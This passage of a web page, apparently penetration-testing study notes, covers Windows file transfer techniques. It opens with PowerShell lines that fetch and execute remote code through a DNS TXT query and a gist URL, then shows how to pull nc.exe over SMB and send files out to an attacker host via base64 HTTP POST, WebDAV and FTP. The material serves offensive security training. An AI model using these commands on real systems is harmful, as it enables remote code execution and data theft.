+<a id="__codelineno-13-21" name="__codelineno-13-21" href="#__codelineno-13-21"></a>IEX<span class="w"> </span><span class="o">([</span>System.Text.Encoding<span class="o">]</span>::UTF8.GetString<span class="o">([</span>System.Convert<span class="o">]</span>::FromBase64String<span class="o">(((</span>nslookup<span class="w"> </span>-querytype<span class="o">=</span>txt<span class="w"> </span><span class="s2">&quot;SERVER&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Select<span class="w"> </span>-Pattern<span class="w"> </span><span class="s1">&#39;&quot;*&quot;&#39;</span><span class="o">)</span><span class="w"> </span>-split<span class="w"> </span><span class="s1">&#39;&quot;&#39;</span><span class="o">[</span><span class="m">0</span><span class="o">]))))</span>
+<a id="__codelineno-13-22" name="__codelineno-13-22" href="#__codelineno-13-22"></a>
+<a id="__codelineno-13-23" name="__codelineno-13-23" href="#__codelineno-13-23"></a><span class="c1"># from @subtee - https://gist.github.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d</span>
+<a id="__codelineno-13-24" name="__codelineno-13-24" href="#__codelineno-13-24"></a>&lt;<span class="c1">#</span>
+<a id="__codelineno-13-25" name="__codelineno-13-25" href="#__codelineno-13-25"></a>&lt;?xml<span class="w"> </span><span class="nv">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span>?&gt;
+<a id="__codelineno-13-26" name="__codelineno-13-26" href="#__codelineno-13-26"></a>&lt;command&gt;
+<a id="__codelineno-13-27" name="__codelineno-13-27" href="#__codelineno-13-27"></a><span class="w">   </span>&lt;a&gt;
+<a id="__codelineno-13-28" name="__codelineno-13-28" href="#__codelineno-13-28"></a><span class="w">      </span>&lt;execute&gt;Get-Process&lt;/execute&gt;
+<a id="__codelineno-13-29" name="__codelineno-13-29" href="#__codelineno-13-29"></a><span class="w">   </span>&lt;/a&gt;
+<a id="__codelineno-13-30" name="__codelineno-13-30" href="#__codelineno-13-30"></a><span class="w">  </span>&lt;/command&gt;
+<a id="__codelineno-13-31" name="__codelineno-13-31" href="#__codelineno-13-31"></a><span class="c1">#&gt;</span>
+<a id="__codelineno-13-32" name="__codelineno-13-32" href="#__codelineno-13-32"></a><span class="nv">$a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Xml.XmlDocument
+<a id="__codelineno-13-33" name="__codelineno-13-33" href="#__codelineno-13-33"></a><span class="nv">$a</span>.Load<span class="o">(</span><span class="s2">&quot;https://gist.githubusercontent.com/subTee/47f16d60efc9f7cfefd62fb7a712ec8d/raw/1ffde429dc4a05f7bc7ffff32017a3133634bc36/gistfile1.txt&quot;</span><span class="o">)</span>
+<a id="__codelineno-13-34" name="__codelineno-13-34" href="#__codelineno-13-34"></a><span class="nv">$a</span>.command.a.execute<span class="w"> </span><span class="p">|</span><span class="w"> </span>iex
+</code></pre></div></p>
+<h2 id="smb-downloads">SMB Downloads</h2>
+<p>The Server Message Block protocol (SMB protocol) that runs on port <code>TCP/445</code> is common in enterprise networks where windows services are running. It enables applications and users to transfer files to and from remote servers.</p>
+<p>WE can use SMB to download files from our pwnbox easily. We need to create an SMB server in our pwnbox with <code>smbserver.py</code> from impacket and then use <code>copy</code>, <code>move</code>,PowerShell <code>Copy-Item</code>, or any other tool that allows connection to SMB</p>
+<h2 id="create-the-smb-server">Create the sMB Server</h2>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="w">    </span>sudo<span class="w"> </span>impacket-smbserver<span class="w"> </span>share<span class="w"> </span>-smb2support<span class="w"> </span>/tmp/smbshare
+</code></pre></div>
+To download a file from the SMB server to the current working directory, we can use the following command:</p>
+<h2 id="copy-a-file-from-the-smb-server">Copy a File from the SMB Server</h2>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="w">    </span>copy<span class="w"> </span><span class="se">\\</span>&lt;ip&gt;<span class="se">\s</span>hare<span class="se">\n</span>c.exe
+</code></pre></div>
+New versions of Windows block unauthenticated guest access, as we can see in the following command:</p>
+<p><div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="w">    </span>copy<span class="w"> </span><span class="se">\\</span>&lt;ip&gt;<span class="se">\s</span>hare<span class="se">\n</span>c.exe
+</code></pre></div>
+Error: You can't access this share folder because your organization's security policies block unauthenticaed guest access. ....</p>
+<p>To transfer files in this scenario we can set a username and password using out Impacket SMB server and mount the SMB server on our windows target machine:</p>
+<h2 id="create-the-smb-server-with-a-username-and-password">Create the SMB Server with a Username and Password</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="w">    </span>sudo<span class="w"> </span>impacket-smbserver<span class="w"> </span>share<span class="w"> </span>-smb2support<span class="w"> </span>/tmp/smbshare<span class="w"> </span>-user<span class="w"> </span><span class="nb">test</span><span class="w"> </span>-password<span class="w"> </span><span class="nb">test</span>
+</code></pre></div>
+<h2 id="mount-the-smb-server-with-username-and-password">Mount the SMB Server with Username and Password</h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="w">    </span>net<span class="w"> </span>use<span class="w"> </span>n:<span class="w"> </span><span class="se">\\</span>&lt;ip&gt;<span class="se">\s</span>hare<span class="w"> </span>/user:test<span class="w"> </span><span class="nb">test</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="w">    </span><span class="c1">#The command completed successfully</span>
+<a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="w">    </span>C:<span class="se">\h</span>tb&gt;<span class="w"> </span>copy<span class="w"> </span>n:<span class="se">\n</span>c.exe
+<a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="w">    </span><span class="c1">#        1 fiel(s) copied.</span>
+</code></pre></div>
+<h3 id="powershell-base64-web-upload">PowerShell Base64 Web Upload</h3>
+<p>This method demonstrates how PowerShell can be used to encode a file in Base64 and upload it to a server using <code>Invoke-WebRequest</code>. The payload is transmitted as a POST request to a specified URI, and the data is then caught using Netcat. Afterward, the data is decoded back to its original form.</p>
+<h3 id="step-1-encoding-the-file-in-base64">Step 1: Encoding the File in Base64</h3>
+<p>First, we convert the contents of a file (<code>hosts</code> file in this case) into Base64:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="nv">$b64</span> <span class="p">=</span> <span class="no">[System.convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="nb">Get-Content</span> <span class="n">-Path</span> <span class="s1">&#39;C:\\Windows\\System32\\drivers\\etc\\hosts&#39;</span> <span class="n">-Encoding</span> <span class="n">Byte</span><span class="p">))</span>
+</code></pre></div>
+<p>This command reads the <code>hosts</code> file as raw bytes and then converts it into a Base64 string.</p>
+<h3 id="step-2-uploading-the-encoded-file-via-http">Step 2: Uploading the Encoded File via HTTP</h3>
+<p>Next, we use <code>Invoke-WebRequest</code> to upload the Base64 encoded file to a remote server. The server is assumed to be listening on port 8000:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="nb">Invoke-WebRequest</span> <span class="n">-Uri</span> <span class="p">&lt;</span><span class="n">http</span><span class="p">://</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">49</span><span class="p">.</span><span class="n">128</span><span class="p">:</span><span class="n">8000</span><span class="p">/&gt;</span> <span class="n">-Method</span> <span class="n">POST</span> <span class="n">-Body</span> <span class="nv">$b64</span>
+</code></pre></div>
+<p>Here, we send the encoded file as a POST request with the Base64 string as the body.</p>
+<h3 id="step-3-catching-the-data-with-netcat">Step 3: Catching the Data with Netcat</h3>
+<p>On the receiving server (listening on port 8000), we use Netcat to catch the incoming Base64 data:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>$<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">8000</span>
+</code></pre></div>
+<p>Netcat listens for connections and displays the incoming data. The Base64-encoded content appears in the console.</p>
+<h3 id="step-4-decoding-the-file">Step 4: Decoding the File</h3>
+<p>After receiving the Base64-encoded data, we decode it back to its original file using the <code>base64</code> tool:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>bash
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>Copy<span class="w"> </span>code
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="nb">echo</span><span class="w"> </span>&lt;base64&gt;<span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>-w<span class="w"> </span><span class="m">0</span><span class="w"> </span>&gt;<span class="w"> </span>hosts
+</code></pre></div>
+<p>This command takes the Base64 data, decodes it, and writes it back to a file (<code>hosts</code>).</p>
+<hr />
+<h3 id="smb-uploads-via-webdav">SMB Uploads via WebDAV</h3>
+<p>The next section discusses using <strong>SMB over HTTP</strong> with WebDAV. Many organizations restrict SMB traffic (TCP/445) due to security concerns, but WebDAV provides a workaround by running SMB over HTTP (TCP/80). This method is commonly used for file sharing and remote access.</p>
+<h3 id="setting-up-webdav-server">Setting Up WebDAV Server</h3>
+<p>To set up a WebDAV server, we install the necessary Python modules:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>$<span class="w"> </span>sudo<span class="w"> </span>pip3<span class="w"> </span>install<span class="w"> </span>wsgidav<span class="w"> </span>cheroot
+</code></pre></div>
+<p>Then, we run the WebDAV server:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>$<span class="w"> </span>sudo<span class="w"> </span>wsgidav<span class="w"> </span>--host<span class="o">=</span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="o">=</span><span class="m">80</span><span class="w"> </span>--root<span class="o">=</span>/tmp<span class="w"> </span>--auth<span class="o">=</span>anonymous
+</code></pre></div>
+<p>This command runs the WebDAV server on port 80, serving files from <code>/tmp</code> with anonymous authentication.</p>
+<h3 id="connecting-to-the-webdav-share">Connecting to the WebDAV Share</h3>
+<p>Once the WebDAV server is set up, we can access it from a Windows machine using the <code>DavWWWRoot</code> folder:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="nb">dir </span><span class="p">\\\\</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">49</span><span class="p">.</span><span class="n">128</span><span class="p">\\</span><span class="n">DavWWWRoot</span>
+</code></pre></div>
+<p>This command lists the files available on the WebDAV server.</p>
+<h3 id="uploading-files-via-webdav">Uploading Files via WebDAV</h3>
+<p>To upload a file (e.g., <code>SourceCode.zip</code>) to the WebDAV share, we use the <code>copy</code> command:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">C</span><span class="p">:\\</span><span class="n">Users</span><span class="p">\\</span><span class="n">john</span><span class="p">\\</span><span class="n">Desktop</span><span class="p">\\</span><span class="n">SourceCode</span><span class="p">.</span><span class="n">zip</span> <span class="p">\\\\</span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">49</span><span class="p">.</span><span class="n">128</span><span class="p">\\</span><span class="n">DavWWWRoot</span><span class="p">\\</span>
+</code></pre></div>
+<p>This uploads the specified file to the WebDAV share, allowing for easy file transfer over HTTP.</p>
+<hr />
+<h3 id="ftp-uploads">FTP Uploads</h3>
+<p>FTP (File Transfer Protocol) is another method for uploading files. In this section, we discuss how to set up an FTP server using Python's <code>pyftpdlib</code> module and how to use PowerShell or command line tools to upload files to it.</p>
+<h3 id="setting-up-the-ftp-server">Setting Up the FTP Server</h3>
+<p>We start the FTP server with the <code>--write</code> flag to allow uploading:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>$<span class="w"> </span>sudo<span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>--port<span class="w"> </span><span class="m">21</span><span class="w"> </span>--write
+</code></pre></div>
+<p>This starts the FTP server on port 21, with write permissions for anonymous users.</p>
+<h3 id="uploading-files-via-powershell">Uploading Files via PowerShell</h3>
+<p>Using PowerShell, we can upload a file to the FTP server with the following command:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">UploadFile</span><span class="p">(</span><span class="s1">&#39;&lt;ftp://192.168.49.128/ftp-hosts&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;C:\\Windows\\System32\\drivers\\etc\\hosts&#39;</span><span class="p">)</span>
+</code></pre></div>
+<p>This command uploads the <code>hosts</code> file to the specified FTP server.</p>
+<h3 id="creating-an-ftp-command-file">Creating an FTP Command File</h3>
+<p>Alternatively, you can create an FTP command file (<code>ftpcommand.txt</code>) to automate the file upload process:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a><span class="nb">echo </span><span class="n">open</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">49</span><span class="p">.</span><span class="n">128</span> <span class="p">&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a><span class="nb">echo </span><span class="n">USER</span> <span class="n">anonymous</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a><span class="nb">echo </span><span class="n">binary</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a><span class="nb">echo </span><span class="n">PUT</span> <span class="n">c</span><span class="p">:\\</span><span class="n">windows</span><span class="p">\\</span><span class="n">system32</span><span class="p">\\</span><span class="n">drivers</span><span class="p">\\</span><span class="n">etc</span><span class="p">\\</span><span class="n">hosts</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a><span class="nb">echo </span><span class="n">bye</span> <span class="p">&gt;&gt;</span> <span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a><span class="n">ftp</span> <span class="n">-v</span> <span class="n">-n</span> <span class="n">-s</span><span class="p">:</span><span class="n">ftpcommand</span><span class="p">.</span><span class="n">txt</span>
+</code></pre></div>
+<p>This script automates logging in, setting the transfer mode to binary, uploading the file, and closing the connection.</p>
+<hr />
+<h3 id="recap">Recap</h3>
+<p>This section highlighted multiple methods to upload files using native tools such as PowerShell, FTP, and WebDAV. Each method allows file transfer under different network configurations, offering flexibility in various penetration testing scenarios.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "content.code.annotation", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.f1b6f286.min.js"></script>
+      
+    
+  </body>
+</html>
